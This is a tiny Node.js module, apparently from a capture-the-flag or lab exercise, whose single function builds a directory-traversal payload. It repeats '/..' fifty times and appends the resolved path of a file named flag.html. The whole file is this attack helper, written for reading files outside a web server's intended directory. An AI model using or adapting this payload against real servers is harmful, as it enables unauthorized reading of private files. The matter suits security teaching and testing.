function getPayload() {
    const path = require("path");  // Ensure path is required
    return "/..".repeat(50) + path.resolve(__dirname, "../flag.html");
}

module.exports = { getPayload };